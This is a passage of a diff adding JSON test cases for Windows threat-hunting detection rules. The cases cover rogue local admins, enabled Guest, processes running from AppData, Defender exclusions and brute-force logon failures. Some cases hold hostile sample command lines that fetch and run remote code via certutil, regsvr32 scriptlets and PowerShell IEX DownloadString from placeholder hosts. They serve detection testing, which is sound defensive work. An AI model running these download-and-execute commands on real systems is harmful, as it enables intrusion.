+            "MemberName": "WS01\\labtemp",
+            "ShortName": "labtemp",
+            "ObjectClass": "User",
+            "PrincipalSource": "Local",
+            "SID": "S-1-5-21-1111111111-2222222222-3333333333-1005"
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "expected Administrator does not fire",
+        "items": [
+          {
+            "Group": "Administrators",
+            "MemberName": "WS01\\Administrator",
+            "ShortName": "Administrator",
+            "ObjectClass": "User",
+            "PrincipalSource": "Local",
+            "SID": "S-1-5-21-1111111111-2222222222-3333333333-500"
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "Domain Admins group is allowlisted",
+        "items": [
+          {
+            "Group": "Administrators",
+            "MemberName": "CORP\\Domain Admins",
+            "ShortName": "Domain Admins",
+            "ObjectClass": "Group",
+            "PrincipalSource": "ActiveDirectory",
+            "SID": "S-1-5-21-1111111111-2222222222-3333333333-512"
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "other group is not monitored",
+        "items": [
+          {
+            "Group": "Users",
+            "MemberName": "WS01\\labtemp",
+            "ShortName": "labtemp",
+            "ObjectClass": "User",
+            "PrincipalSource": "Local",
+            "SID": "S-1-5-21-1111111111-2222222222-3333333333-1005"
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-ACCT-002": [
+      {
+        "name": "enabled Guest fires",
+        "items": [
+          {
+            "AccountName": "Guest",
+            "Enabled": true,
+            "SID": "S-1-5-21-1111111111-2222222222-3333333333-501",
+            "PasswordRequired": true,
+            "PasswordLastSet": "2026-08-14T21:00:00.000Z",
+            "LastLogon": "2026-10-16T04:00:00.000Z"
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "disabled Guest does not fire",
+        "items": [
+          {
+            "AccountName": "Guest",
+            "Enabled": false,
+            "SID": "S-1-5-21-1111111111-2222222222-3333333333-501",
+            "PasswordRequired": false,
+            "PasswordLastSet": "2026-08-14T21:00:00.000Z",
+            "LastLogon": "2026-10-16T04:00:00.000Z"
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "other account does not fire",
+        "items": [
+          {
+            "AccountName": "labuser",
+            "Enabled": true,
+            "SID": "S-1-5-21-1111111111-2222222222-3333333333-1001",
+            "PasswordRequired": true,
+            "PasswordLastSet": "2026-08-14T21:00:00.000Z",
+            "LastLogon": "2026-10-16T04:00:00.000Z"
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-ACCT-003": [
+      {
+        "name": "enabled account without password fires",
+        "items": [
+          {
+            "AccountName": "svc_backup",
+            "Enabled": true,
+            "SID": "S-1-5-21-1111111111-2222222222-3333333333-1002",
+            "PasswordRequired": false,
+            "PasswordLastSet": "2026-08-14T21:00:00.000Z",
+            "LastLogon": "2026-10-16T04:00:00.000Z"
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "Guest is excluded (covered by ACCT-002)",
+        "items": [
+          {
+            "AccountName": "Guest",
+            "Enabled": true,
+            "SID": "S-1-5-21-1111111111-2222222222-3333333333-501",
+            "PasswordRequired": false,
+            "PasswordLastSet": "2026-08-14T21:00:00.000Z",
+            "LastLogon": "2026-10-16T04:00:00.000Z"
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "account requiring a password does not fire",
+        "items": [
+          {
+            "AccountName": "labuser",
+            "Enabled": true,
+            "SID": "S-1-5-21-1111111111-2222222222-3333333333-1001",
+            "PasswordRequired": true,
+            "PasswordLastSet": "2026-08-14T21:00:00.000Z",
+            "LastLogon": "2026-10-16T04:00:00.000Z"
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-PROC-001": [
+      {
+        "name": "process from AppData fires",
+        "items": [
+          {
+            "ProcessId": 4100,
+            "ParentProcessId": 1000,
+            "Name": "tool.exe",
+            "ExecutablePath": "C:\\Users\\labuser\\AppData\\Local\\Tool\\tool.exe",
+            "CommandLine": "tool.exe",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "Program Files process does not fire",
+        "items": [
+          {
+            "ProcessId": 4200,
+            "ParentProcessId": 1000,
+            "Name": "chrome.exe",
+            "ExecutablePath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "CommandLine": "chrome.exe",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "Defender engine under ProgramData is trusted",
+        "items": [
+          {
+            "ProcessId": 4300,
+            "ParentProcessId": 1000,
+            "Name": "MsMpEng.exe",
+            "ExecutablePath": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe",
+            "CommandLine": null,
+            "CommandLineAvailable": false,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "process with unreadable path does not fire",
+        "items": [
+          {
+            "ProcessId": 4,
+            "ParentProcessId": 0,
+            "Name": "System",
+            "ExecutablePath": null,
+            "CommandLine": null,
+            "CommandLineAvailable": false,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-PROC-002": [
+      {
+        "name": "encoded PowerShell fires",
+        "items": [
+          {
+            "ProcessId": 5100,
+            "ParentProcessId": 1000,
+            "Name": "powershell.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -NoP -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "ExecutionPolicy Bypass does not match -e",
+        "items": [
+          {
+            "ProcessId": 5200,
+            "ParentProcessId": 1000,
+            "Name": "powershell.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\a.ps1",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "short -e value does not fire",
+        "items": [
+          {
+            "ProcessId": 5300,
+            "ParentProcessId": 1000,
+            "Name": "powershell.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -e abc",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "non-PowerShell process does not fire",
+        "items": [
+          {
+            "ProcessId": 5400,
+            "ParentProcessId": 1000,
+            "Name": "tool.exe",
+            "ExecutablePath": "C:\\Program Files\\Tool\\tool.exe",
+            "CommandLine": "tool.exe -e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-PROC-003": [
+      {
+        "name": "Word started cmd fires",
+        "items": [
+          {
+            "ProcessId": 6100,
+            "ParentProcessId": 6000,
+            "Name": "cmd.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": "WINWORD.EXE",
+            "ParentExecutablePath": null,
+            "ParentReliable": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "Explorer started cmd does not fire",
+        "items": [
+          {
+            "ProcessId": 6200,
+            "ParentProcessId": 6000,
+            "Name": "cmd.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": "explorer.exe",
+            "ParentExecutablePath": null,
+            "ParentReliable": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "Word started a non-interpreter does not fire",
+        "items": [
+          {
+            "ProcessId": 6300,
+            "ParentProcessId": 6000,
+            "Name": "splwow64.exe",
+            "ExecutablePath": "C:\\Windows\\splwow64.exe",
+            "CommandLine": "splwow64.exe",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": "WINWORD.EXE",
+            "ParentExecutablePath": null,
+            "ParentReliable": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "unknown parent does not fire",
+        "items": [
+          {
+            "ProcessId": 6400,
+            "ParentProcessId": 6000,
+            "Name": "cmd.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-PROC-004": [
+      {
+        "name": "certutil urlcache fires",
+        "items": [
+          {
+            "ProcessId": 7100,
+            "ParentProcessId": 1000,
+            "Name": "certutil.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.9/a.txt a.txt",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "regsvr32 scriptlet fires",
+        "items": [
+          {
+            "ProcessId": 7200,
+            "ParentProcessId": 1000,
+            "Name": "regsvr32.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32 /s /n /u /i:http://example.com/x.sct scrobj.dll",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "certutil hashfile does not fire",
+        "items": [
+          {
+            "ProcessId": 7300,
+            "ParentProcessId": 1000,
+            "Name": "certutil.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -hashfile C:\\file.zip SHA256",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-PROC-005": [
+      {
+        "name": "svchost in Temp fires",
+        "items": [
+          {
+            "ProcessId": 8100,
+            "ParentProcessId": 1000,
+            "Name": "svchost.exe",
+            "ExecutablePath": "C:\\Users\\labuser\\AppData\\Local\\Temp\\svchost.exe",
+            "CommandLine": "svchost.exe",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "real svchost does not fire",
+        "items": [
+          {
+            "ProcessId": 8200,
+            "ParentProcessId": 700,
+            "Name": "svchost.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\svchost.exe",
+            "CommandLine": "svchost.exe -k netsvcs -p",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "unrelated name does not fire",
+        "items": [
+          {
+            "ProcessId": 8300,
+            "ParentProcessId": 1000,
+            "Name": "chrome.exe",
+            "ExecutablePath": "C:\\Users\\labuser\\AppData\\Local\\Temp\\chrome.exe",
+            "CommandLine": "chrome.exe",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "hidden path does not fire",
+        "items": [
+          {
+            "ProcessId": 8400,
+            "ParentProcessId": 700,
+            "Name": "svchost.exe",
+            "ExecutablePath": null,
+            "CommandLine": null,
+            "CommandLineAvailable": false,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-PROC-006": [
+      {
+        "name": "IEX DownloadString fires",
+        "items": [
+          {
+            "ProcessId": 9100,
+            "ParentProcessId": 1000,
+            "Name": "powershell.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/p.ps1')\"",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "plain cmdlet does not fire",
+        "items": [
+          {
+            "ProcessId": 9200,
+            "ParentProcessId": 1000,
+            "Name": "powershell.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -c Get-Process",
+            "CommandLineAvailable": true,
+            "CreationTime": "2026-10-16T07:00:00.000Z",
+            "Owner": null,
+            "ParentName": null,
+            "ParentExecutablePath": null,
+            "ParentReliable": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-NET-001": [
+      {
+        "name": "listener from AppData fires",
+        "items": [
+          {
+            "Protocol": "TCP",
+            "State": "Listen",
+            "LocalAddress": "0.0.0.0",
+            "LocalPort": 8081,
+            "RemoteAddress": "0.0.0.0",
+            "RemotePort": 0,
+            "OwningProcess": 4100,
+            "ProcessName": "tool.exe",
+            "ProcessPath": "C:\\Users\\labuser\\AppData\\Local\\Tool\\tool.exe",
+            "IsListening": true,
+            "LocalIsLoopback": false,
+            "RemoteIsPublic": false
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "loopback listener does not fire",
+        "items": [
+          {
+            "Protocol": "TCP",
+            "State": "Listen",
+            "LocalAddress": "127.0.0.1",
+            "LocalPort": 8081,
+            "RemoteAddress": "0.0.0.0",
+            "RemotePort": 0,
+            "OwningProcess": 4100,
+            "ProcessName": "tool.exe",
+            "ProcessPath": "C:\\Users\\labuser\\AppData\\Local\\Tool\\tool.exe",
+            "IsListening": true,
+            "LocalIsLoopback": true,
+            "RemoteIsPublic": false
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "system listener does not fire",
+        "items": [
+          {
+            "Protocol": "TCP",
+            "State": "Listen",
+            "LocalAddress": "0.0.0.0",
+            "LocalPort": 135,
+            "RemoteAddress": "0.0.0.0",
+            "RemotePort": 0,
+            "OwningProcess": 800,
+            "ProcessName": "svchost.exe",
+            "ProcessPath": "C:\\Windows\\System32\\svchost.exe",
+            "IsListening": true,
+            "LocalIsLoopback": false,
+            "RemoteIsPublic": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-NET-002": [
+      {
+        "name": "mshta to a public address fires",
+        "items": [
+          {
+            "Protocol": "TCP",
+            "State": "Established",
+            "LocalAddress": "10.0.0.5",
+            "LocalPort": 50123,
+            "RemoteAddress": "203.0.113.50",
+            "RemotePort": 443,
+            "OwningProcess": 7000,
+            "ProcessName": "mshta.exe",
+            "ProcessPath": "C:\\Windows\\System32\\mshta.exe",
+            "IsListening": false,
+            "LocalIsLoopback": false,
+            "RemoteIsPublic": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "browser to a public address does not fire",
+        "items": [
+          {
+            "Protocol": "TCP",
+            "State": "Established",
+            "LocalAddress": "10.0.0.5",
+            "LocalPort": 50124,
+            "RemoteAddress": "203.0.113.60",
+            "RemotePort": 443,
+            "OwningProcess": 7001,
+            "ProcessName": "chrome.exe",
+            "ProcessPath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "IsListening": false,
+            "LocalIsLoopback": false,
+            "RemoteIsPublic": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "mshta to a private address does not fire",
+        "items": [
+          {
+            "Protocol": "TCP",
+            "State": "Established",
+            "LocalAddress": "10.0.0.5",
+            "LocalPort": 50125,
+            "RemoteAddress": "10.0.0.9",
+            "RemotePort": 80,
+            "OwningProcess": 7000,
+            "ProcessName": "mshta.exe",
+            "ProcessPath": "C:\\Windows\\System32\\mshta.exe",
+            "IsListening": false,
+            "LocalIsLoopback": false,
+            "RemoteIsPublic": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-NET-003": [
+      {
+        "name": "AppData process to a public address fires",
+        "items": [
+          {
+            "Protocol": "TCP",
+            "State": "Established",
+            "LocalAddress": "10.0.0.5",
+            "LocalPort": 50130,
+            "RemoteAddress": "203.0.113.61",
+            "RemotePort": 443,
+            "OwningProcess": 7100,
+            "ProcessName": "tool.exe",
+            "ProcessPath": "C:\\Users\\labuser\\AppData\\Local\\Tool\\tool.exe",
+            "IsListening": false,
+            "LocalIsLoopback": false,
+            "RemoteIsPublic": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "Program Files process does not fire",
+        "items": [
+          {
+            "Protocol": "TCP",
+            "State": "Established",
+            "LocalAddress": "10.0.0.5",
+            "LocalPort": 50131,
+            "RemoteAddress": "203.0.113.62",
+            "RemotePort": 443,
+            "OwningProcess": 7101,
+            "ProcessName": "chrome.exe",
+            "ProcessPath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "IsListening": false,
+            "LocalIsLoopback": false,
+            "RemoteIsPublic": true
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-DEF-001": [
+      {
+        "name": "real-time protection off in normal mode fires",
+        "items": [
+          {
+            "AMRunningMode": "Normal",
+            "AntivirusEnabled": true,
+            "AMServiceEnabled": true,
+            "RealTimeProtectionEnabled": false,
+            "BehaviorMonitorEnabled": true,
+            "IoavProtectionEnabled": true,
+            "IsTamperProtected": true,
+            "AntivirusSignatureAgeDays": 1,
+            "AntivirusSignatureLastUpdated": "2026-10-15T09:00:00.000Z"
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "passive mode does not fire",
+        "items": [
+          {
+            "AMRunningMode": "Passive",
+            "AntivirusEnabled": true,
+            "AMServiceEnabled": true,
+            "RealTimeProtectionEnabled": false,
+            "BehaviorMonitorEnabled": true,
+            "IoavProtectionEnabled": true,
+            "IsTamperProtected": true,
+            "AntivirusSignatureAgeDays": 1,
+            "AntivirusSignatureLastUpdated": "2026-10-15T09:00:00.000Z"
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "healthy status does not fire",
+        "items": [
+          {
+            "AMRunningMode": "Normal",
+            "AntivirusEnabled": true,
+            "AMServiceEnabled": true,
+            "RealTimeProtectionEnabled": true,
+            "BehaviorMonitorEnabled": true,
+            "IoavProtectionEnabled": true,
+            "IsTamperProtected": true,
+            "AntivirusSignatureAgeDays": 1,
+            "AntivirusSignatureLastUpdated": "2026-10-15T09:00:00.000Z"
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-DEF-002": [
+      {
+        "name": "detection event fires",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Windows Defender/Operational",
+            "EventId": 1116,
+            "TimeCreated": "2026-10-16T09:05:00.000Z",
+            "Provider": "Microsoft-Windows-Windows Defender",
+            "Computer": "WS-LAB-03",
+            "RecordId": 8116,
+            "Data": {
+              "ThreatName": "Virus:DOS/EICAR_Test_File",
+              "SeverityName": "Severe",
+              "CategoryName": "Virus",
+              "Path": "file:_C:\\Users\\labuser\\Downloads\\eicar.com",
+              "DetectionUser": "WS-LAB-03\\labuser"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "configuration change does not fire",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Windows Defender/Operational",
+            "EventId": 5007,
+            "TimeCreated": "2026-10-16T09:05:00.000Z",
+            "Provider": "Microsoft-Windows-Windows Defender",
+            "Computer": "WS-LAB-03",
+            "RecordId": 12007,
+            "Data": {}
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-DEF-003": [
+      {
+        "name": "Downloads path exclusion fires",
+        "items": [
+          {
+            "Type": "Path",
+            "Value": "C:\\Users\\labuser\\Downloads"
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "whole drive exclusion fires",
+        "items": [
+          {
+            "Type": "Path",
+            "Value": "C:\\"
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "ps1 extension exclusion fires",
+        "items": [
+          {
+            "Type": "Extension",
+            "Value": ".ps1"
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "powershell process exclusion fires",
+        "items": [
+          {
+            "Type": "Process",
+            "Value": "powershell.exe"
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "vendor data folder does not fire",
+        "items": [
+          {
+            "Type": "Path",
+            "Value": "C:\\Program Files\\Vendor\\data"
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "benign extension does not fire",
+        "items": [
+          {
+            "Type": "Extension",
+            "Value": "log"
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-DEF-004": [
+      {
+        "name": "10 day old signatures fire",
+        "items": [
+          {
+            "AMRunningMode": "Normal",
+            "AntivirusEnabled": true,
+            "AMServiceEnabled": true,
+            "RealTimeProtectionEnabled": true,
+            "BehaviorMonitorEnabled": true,
+            "IoavProtectionEnabled": true,
+            "IsTamperProtected": true,
+            "AntivirusSignatureAgeDays": 10,
+            "AntivirusSignatureLastUpdated": "2026-10-06T09:00:00.000Z"
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "2 day old signatures do not fire",
+        "items": [
+          {
+            "AMRunningMode": "Normal",
+            "AntivirusEnabled": true,
+            "AMServiceEnabled": true,
+            "RealTimeProtectionEnabled": true,
+            "BehaviorMonitorEnabled": true,
+            "IoavProtectionEnabled": true,
+            "IsTamperProtected": true,
+            "AntivirusSignatureAgeDays": 2,
+            "AntivirusSignatureLastUpdated": "2026-10-14T09:00:00.000Z"
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "unknown age does not fire",
+        "items": [
+          {
+            "AMRunningMode": "Normal",
+            "AntivirusEnabled": true,
+            "AMServiceEnabled": true,
+            "RealTimeProtectionEnabled": true,
+            "BehaviorMonitorEnabled": true,
+            "IoavProtectionEnabled": true,
+            "IsTamperProtected": true,
+            "AntivirusSignatureAgeDays": null,
+            "AntivirusSignatureLastUpdated": "2026-10-16T09:00:00.000Z"
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-DEF-005": [
+      {
+        "name": "event 5001 fires",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Windows Defender/Operational",
+            "EventId": 5001,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Windows Defender",
+            "Computer": "WS-LAB-03",
+            "RecordId": 12001,
+            "Data": {
+              "ProductName": "Microsoft Defender Antivirus",
+              "ProductVersion": "4.18.24090.11"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "detection event does not fire",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Windows Defender/Operational",
+            "EventId": 1116,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Windows Defender",
+            "Computer": "WS-LAB-03",
+            "RecordId": 8116,
+            "Data": {}
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-EVT-001": [
+      {
+        "name": "10 failures in 5 minutes fire",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1000,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1001,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:01:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1002,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:01:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1003,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1004,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:02:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1005,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1006,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:03:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1007,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
+            "TimeCreated": "2026-10-16T09:04:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 1008,
+            "Data": {
+              "TargetUserName": "labuser",
+              "TargetDomainName": "WS-LAB-03",
+              "IpAddress": "198.51.100.23",
+              "LogonType": "3",
+              "Status": "0xc000006d",
+              "SubStatus": "0xc000006a",
+              "WorkstationName": "KALI-LAB"
+            }
+          },
+          {
+            "Channel": "Security",
+            "EventId": 4625,
